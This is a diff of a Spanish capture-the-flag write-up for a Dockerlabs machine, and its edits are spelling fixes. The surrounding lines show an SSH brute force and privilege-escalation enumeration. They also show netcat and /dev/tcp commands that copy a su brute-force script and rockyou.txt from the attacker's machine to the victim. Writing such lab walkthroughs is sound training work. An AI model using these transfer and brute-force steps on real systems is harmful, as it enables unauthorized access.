@@ -82,11 +82,11 @@ tampoco, al final me he complicado para nada, vamos con la fuerza bruta:
 
 ![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/180fb159-c9ef-4a7d-b88a-d15375cceb47)
 
-efectivamente tenemos le ssh xd, vamos a entrar y enumerar para la escalada de privilegios:
+efectivamente tenemos el ssh xd, vamos a entrar y enumerar para la escalada de privilegios:
 
 ![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/0da0de24-7772-420f-8621-6635dcef4f62)
 
-empezamos con sudo -l y no va, SUID tampoco hay nada, tareas crom tampoco, etc. No he enocntrado nada, así que vamos
+empezamos con sudo -l y no va, SUID tampoco hay nada, tareas crom tampoco, etc. No he encontrado nada, así que vamos
 a intentar iniciar el ssh con el otro usuario, llevo un tiempo y nada, vamos a intentar entonces con el script de fuerza bruta de mario,
 ademas al ser una máquina de mario, pues tiene toda la pinta:
 
@@ -99,14 +99,14 @@ nc -nlvp 443 < Linux-Su-Force.sh # Nuestra máquina
 cat < /dev/tcp/192.168.1.37/443 > Linux-Su-Forze.sh # En la máquina víctima
 ```
 
-ademas del script, tengo que pasar tambien el rockyou.txt, entonces hacemos lo mismo:
+ademas del script, tengo que pasar también el rockyou.txt, entonces hacemos lo mismo:
 
 ```
 nc -nlvp 443 < rockyou.txt # Nuestra máquina
 cat < /dev/tcp/192.168.1.37/443 > rockyou.txt # En la máquina víctima
 ```
 
-y efectivamente nos la encuentra:
+y efectiva mente nos la encuentra:
 
 ![image](https://github.com/FakeLuci/Dockerlabs-Writups/assets/96147300/f771e922-a56a-4be8-9a40-1633bc8a7d83)
 
